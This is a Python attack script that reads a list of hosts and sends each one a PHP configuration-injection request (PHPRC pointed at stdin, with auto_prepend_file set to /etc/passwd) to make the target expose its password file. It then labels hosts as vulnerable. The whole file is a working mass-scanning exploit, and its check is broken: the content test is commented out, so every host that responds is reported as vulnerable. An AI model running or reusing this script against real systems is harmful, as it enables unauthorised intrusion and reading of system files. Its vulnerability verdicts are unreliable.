import requests
import argparse

def check_host_vulnerability(host):
    url = f"http://{host}/?PHPRC=/dev/fd/0"
    data = {'auto_prepend_file': '/etc/passwd'}
    
    try:
        response = requests.post(url, data=data, timeout=5, verify=False)
        
        # Here, you can add more sophisticated checks depending on how you identify a vulnerable host
        # For example, checking if the response contains certain strings:
        # if "root:x:0:0" in response.text:
        #     return True

        # The below line will just print all the hosts that responded to the request
        return True

    except requests.RequestException as e:
        print(f"Error checking {host}: {e}")
        return False

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Check hosts for PHP configuration vulnerability')
    parser.add_argument('file', type=str, help='Path to the file containing list of hosts')

    args = parser.parse_args()

    with open(args.file, "r") as file:
        for host in file:
            host = host.strip()  # Remove newline or whitespace
            if check_host_vulnerability(host):
                print(f"{host} is VULN")

